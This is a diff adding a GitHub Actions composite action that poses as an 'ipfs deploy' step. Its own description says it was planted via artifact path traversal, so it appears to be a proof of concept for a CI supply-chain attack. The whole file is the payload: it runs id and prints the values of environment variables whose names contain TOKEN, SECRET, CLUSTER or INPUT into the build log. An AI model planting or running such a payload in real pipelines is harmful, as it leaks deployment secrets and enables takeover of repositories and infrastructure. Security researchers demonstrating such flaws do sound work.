@@ -1,0 +1,18 @@
+name: 'ipfs deploy (replaced)'
+description: 'replacement composite action planted via artifact path traversal'
+runs:
+  using: 'composite'
+  steps:
+    - name: proof
+      shell: bash
+      run: |
+        echo "GAB_RCE_MARKER_START"
+        id
+        echo "PWD=$PWD"
+        echo "--- cluster inputs visible to this step ---"
+        for v in $(env | grep -o '^[A-Za-z0-9_-]*' | sort -u); do
+          case "$v" in
+            *CLUSTER*|*INPUT*|*TOKEN*|*SECRET*) echo "$v=${!v}";;
+          esac
+        done
+        echo "GAB_RCE_MARKER_END"
